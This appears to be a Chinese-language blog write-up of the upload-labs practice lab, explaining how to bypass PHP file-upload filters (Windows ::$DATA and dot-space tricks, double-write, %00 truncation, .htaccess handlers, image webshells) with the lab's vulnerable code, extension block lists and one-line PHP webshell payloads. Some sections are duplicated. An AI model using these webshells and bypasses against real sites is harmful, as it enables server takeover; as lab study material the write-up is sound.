<p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191215222245597.png" alt="image-20191215222245597"></p>
<p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216094636357.png" alt="image-20191216094636357"></p>
<p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216094702159.png" alt="image-20191216094702159"></p>
<h3 id="加”-DATA”绕过-Windows流特性绕过"><a href="#加”-DATA”绕过-Windows流特性绕过" class="headerlink" title="加” ::$DATA”绕过 Windows流特性绕过"></a>加” ::$DATA”绕过 Windows流特性绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php在windows的时候如果文件名+&quot;::$DATA&quot;会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持&quot;::$DATA&quot;之前的文件名。</span><br></pre></td></tr></table></figure>

<p>没有对后缀名进行去”::$DATA”处理，利用windows特性，可在后缀名中加” ::$DATA”绕过</p>
<p><code>$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA</code></p>
<p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191215222845262.png" alt="image-20191215222845262"></p>
<p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216094747875.png" alt="image-20191216094747875"></p>
<p>![image-20200729142114788](5 文件上传/image-20200729142114788.png)</p>
<p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216094838943.png" alt="image-20191216094838943"></p>
<h3 id="点空格点绕过-windows特性"><a href="#点空格点绕过-windows特性" class="headerlink" title="点空格点绕过 windows特性"></a>点空格点绕过 windows特性</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>,<span class="string">".ini"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>又是涨姿势的一关，程序先是去除文件名前后的空格，再去除文件名最后所有的.，再通过strrchar来寻找.来确认文件名的后缀，但是最后保存文件的时候没有重命名而使用的原始的文件名，导致可以利用类似one.php. .(两个点号之间有一个空格)绕过，如果重名名了文件的话应该会用$file_ext来进行拼凑文件，这样保存在服务器中的文件将没有后缀（去除了.空格）</p>
<p>如果从第三关到第九关，如果目标服务器是windows系统的话，均可用点空格点绕过。</p>
<p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216092336256.png" alt="image-20191216092336256"></p>
<p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216094104714.png" alt="image-20191216094104714"></p>
<p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216094151764.png" alt="image-20191216094151764"></p>
<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p><code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);    <span class="comment">//替换黑名单内文件后缀为空  str_ireplace会重复替换 1.phpphp传上去就变成1</span></span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>![image-20200729143826059](5 文件上传/image-20200729143826059.png)</p>
<p>![image-20200729143838954](5 文件上传/image-20200729143838954.png)</p>
<p>不成功</p>
<p>![](5 文件上传/image-20200729144114564.png)</p>
<p>![image-20200729144046619](5 文件上传/image-20200729144046619.png)</p>
<p>成功</p>
<p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216091811854.png" alt="image-20191216091811854"></p>
<p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216095058144.png" alt="image-20191216095058144"></p>
<h2 id="白名单检测"><a href="#白名单检测" class="headerlink" title="白名单检测"></a>白名单检测</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>截断条件：</p>
<p>1、php版本小于5.3.4 2、php.ini的magic_quotes_gpc为OFF状态</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line">不能<span class="number">00</span>截断的：</span><br><span class="line">$img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br></pre></td></tr></table></figure>

<p><img src="https://math.jianshu.com/math?formula=_GET%5B%27sava_path%27%5D%E5%92%8C%E9%9A%8F%E6%9C%BA%E6%97%B6%E9%97%B4%E5%87%BD%E6%95%B0%E8%BF%9B%E8%A1%8C%E6%8B%BC%E6%8E%A5%EF%BC%8C%E6%8B%BC%E6%8E%A5%E6%88%90%E6%96%87%E4%BB%B6%E5%AD%98%E5%82%A8%E8%B7%AF%E5%BE%84%E3%80%82%E8%BF%99%E9%87%8C%E6%9E%84%E9%80%A0%E6%96%87%E4%BB%B6%E5%AD%98%E5%82%A8%E8%B7%AF%E5%BE%84%E5%88%A9%E7%94%A8%E4%BA%86" alt="_GET[&#39;sava_path&#39;]和随机时间函数进行拼接，拼接成文件存储路径。这里构造文件存储路径利用了">_GET传入，导致服务器最终存储的文件名可控。故可以利用这个点进行绕过。 这里利用的是00截断。即move_uploaded_file函数的底层实现类似于C语言，遇到0x00会截断</p>
<p><img src="file://D:/%E6%96%87%E6%A1%A3/zhiliya.github.io/source/_posts/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216103139497.png?lastModify=1596005136" alt="image-20191216103139497"></p>
<p><img src="file://D:/%E6%96%87%E6%A1%A3/zhiliya.github.io/source/_posts/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216103149146.png?lastModify=1596005136" alt="image-20191216103149146"></p>
<p>和十一关不同的是这次的save_path是通过post传进来的，还是利用00截断，但这次需要在二进制中进行修改，因为post不会像get中url对%00进行自动解码。</p>
<p><img src="file://D:/%E6%96%87%E6%A1%A3/zhiliya.github.io/source/_posts/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216103644070.png?lastModify=1596005136" alt="image-20191216103644070"></p>
<p><img src="file://D:/%E6%96%87%E6%A1%A3/zhiliya.github.io/source/_posts/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216103652247.png?lastModify=1596005136" alt="image-20191216103652247"></p>
<p>move_uploaded_file会忽略掉文件末尾的/. 所以可以构造save_path=1.php/.,这样file_ext值就为空，就能绕过黑名单，而move_uploaded_file函数忽略文件末尾的/.可以实现保存文件为.php</p>
<p>post: save_name = 1.php/.</p>
<h2 id="htaccess-文件攻击-容易失败"><a href="#htaccess-文件攻击-容易失败" class="headerlink" title=".htaccess 文件攻击(容易失败)"></a>.htaccess 文件攻击(容易失败)</h2><p>虽然还是黑名单，但几乎过滤了所有有问题的后缀名，除了.htaccess，于是首先上传一个.htaccess内容如下的文件:</p>
<p>![image-20200729111116730](5 文件上传/image-20200729111116730.png)</p>
<p>1.</p>
<p>构造.htaccess文件，内容如下:<code>AddType application/x-httpd-php .jpg</code><br> 这里代码的意思可以让 .jpg后缀名文件格式的文件名以php格式解析，因此达到了可执行的效果</p>
<p>.htaccess文件中的配置指令作用于.htaccess文件所在的目录及其所有子目录，但是很重要的、需要注意的是，其上级目录也可能会有.htaccess文件，而指令是按查找顺序依次生效的，所以一个特定目录下的.htaccess文件中的指令可能会覆盖其上级目录中的.htaccess文件中的指令，即子目录中的指令会覆盖父目录或者主配置文件中的指令。</p>
<p>2..htaccess内容为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">"文件名"</span>&gt;</span><br><span class="line"> SetHandler application/x-httpd-php </span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">    </span><br><span class="line">&lt;FilesMatch <span class="string">"1"</span>&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">同目录有个我们上传一个只有文件名并包含字符串<span class="string">"haha"</span>，但是却无任何扩展名的文件</span><br><span class="line">里面的内容是 php 一句话木马</span><br></pre></td></tr></table></figure>

<h1 id="服务端检测绕过-目录路径检测"><a href="#服务端检测绕过-目录路径检测" class="headerlink" title="服务端检测绕过(目录路径检测)"></a>服务端检测绕过(目录路径检测)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="00截断-1"><a href="#00截断-1" class="headerlink" title="%00截断"></a>%00截断</h2><p>截断条件：</p>
<p>1、php版本小于5.3.4 2、php.ini的magic_quotes_gpc为OFF状态</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line">不能<span class="number">00</span>截断的：</span><br><span class="line">$img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br></pre></td></tr></table></figure>

<p><img src="https://math.jianshu.com/math?formula=_GET%5B%27sava_path%27%5D%E5%92%8C%E9%9A%8F%E6%9C%BA%E6%97%B6%E9%97%B4%E5%87%BD%E6%95%B0%E8%BF%9B%E8%A1%8C%E6%8B%BC%E6%8E%A5%EF%BC%8C%E6%8B%BC%E6%8E%A5%E6%88%90%E6%96%87%E4%BB%B6%E5%AD%98%E5%82%A8%E8%B7%AF%E5%BE%84%E3%80%82%E8%BF%99%E9%87%8C%E6%9E%84%E9%80%A0%E6%96%87%E4%BB%B6%E5%AD%98%E5%82%A8%E8%B7%AF%E5%BE%84%E5%88%A9%E7%94%A8%E4%BA%86" alt="_GET[&#39;sava_path&#39;]和随机时间函数进行拼接，拼接成文件存储路径。这里构造文件存储路径利用了">_GET传入，导致服务器最终存储的文件名可控。故可以利用这个点进行绕过。 这里利用的是00截断。即move_uploaded_file函数的底层实现类似于C语言，遇到0x00会截断</p>
<p><img src="file://D:/%E6%96%87%E6%A1%A3/zhiliya.github.io/source/_posts/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216103139497.png?lastModify=1596005136" alt="image-20191216103139497"></p>
<p><img src="file://D:/%E6%96%87%E6%A1%A3/zhiliya.github.io/source/_posts/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216103149146.png?lastModify=1596005136" alt="image-20191216103149146"></p>
<p>和十一关不同的是这次的save_path是通过post传进来的，还是利用00截断，但这次需要在二进制中进行修改，因为post不会像get中url对%00进行自动解码。</p>
<p><img src="file://D:/%E6%96%87%E6%A1%A3/zhiliya.github.io/source/_posts/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216103644070.png?lastModify=1596005136" alt="image-20191216103644070"></p>
<p><img src="file://D:/%E6%96%87%E6%A1%A3/zhiliya.github.io/source/_posts/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216103652247.png?lastModify=1596005136" alt="image-20191216103652247"></p>
<p>move_uploaded_file会忽略掉文件末尾的/. 所以可以构造save_path=1.php/.,这样file_ext值就为空，就能绕过黑名单，而move_uploaded_file函数忽略文件末尾的/.可以实现保存文件为.php</p>
<p>post: save_name = 1.php/.</p>
<h1 id="服务端检测绕过-文件内容检测"><a href="#服务端检测绕过-文件内容检测" class="headerlink" title="服务端检测绕过(文件内容检测)"></a>服务端检测绕过(文件内容检测)</h1><h2 id="绕过检测-lt"><a href="#绕过检测-lt" class="headerlink" title="绕过检测&lt;?"></a>绕过检测&lt;?</h2><p>不能出现”&lt;?”，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">"pHp"</span>&gt;phpinfo();&lt;/script&gt;</span><br><span class="line">&lt;script language=<span class="string">"pHp"</span>&gt;@<span class="keyword">eval</span>($_POST[<span class="string">'zhiliya'</span>])&lt;/script&gt;</span><br><span class="line">&lt;script language=<span class="string">'php'</span>&gt;assert($_REQUEST[<span class="string">'cmd'</span>])&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="文件幻数检测-图片马"><a href="#文件幻数检测-图片马" class="headerlink" title="文件幻数检测 图片马"></a>文件幻数检测 图片马</h2><h3 id="对比文件的前两个字节-需要使用文件包含漏洞"><a href="#对比文件的前两个字节-需要使用文件包含漏洞" class="headerlink" title="对比文件的前两个字节 需要使用文件包含漏洞"></a>对比文件的前两个字节 需要使用文件包含漏洞</h3><h4 id="gif-没包含成功"><a href="#gif-没包含成功" class="headerlink" title="gif 没包含成功"></a>gif 没包含成功</h4><p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216111212800.png" alt="image-20191216111212800"></p>
<p>使用<a href="http://127.0.0.1/upload-labs/include.php" target="_blank" rel="noopener">文件包含漏洞</a>能运行图片马中的恶意代码。</p>
<p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216111724118.png" alt="image-20191216111724118"></p>
<p>file</p>
<p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216112308730.png" alt="image-20191216112308730"></p>
<p>php://filter/read=convert.base64-encode/resource=</p>
<p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216111705672.png" alt="image-20191216111705672"></p>
<h4 id="png"><a href="#png" class="headerlink" title="png"></a>png</h4><p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216112801960.png" alt="image-20191216112801960"></p>
<p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216112953871.png" alt="image-20191216112953871"></p>
<p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216113017324.png" alt="image-20191216113017324"></p>
<p>![image-20200729153603896](5 文件上传/image-20200729153603896.png)</p>
<p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216113112210.png" alt="image-20191216113112210">连不上的</p>
<h4 id="jpeg"><a href="#jpeg" class="headerlink" title="jpeg"></a>jpeg</h4><p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216113345989.png" alt="image-20191216113345989"></p>
<p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216113444242.png" alt="image-20191216113444242"></p>
<p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216113700995.png" alt="image-20191216113700995"></p>
<h3 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize"></a>getimagesize</h3><p><code>$info = getimagesize($filename);</code></p>
<p><img src="https://upload-images.jianshu.io/upload_images/11525934-9a5317a41eb10a29.JPG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1056" alt="img"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $types = <span class="string">'.jpeg|.png|.gif'</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">        $info = getimagesize($filename);</span><br><span class="line">        $ext = image_type_to_extension($info[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos($types,$ext)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> $ext;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20191216114906804.png" alt="image-20191216114906804"></p>
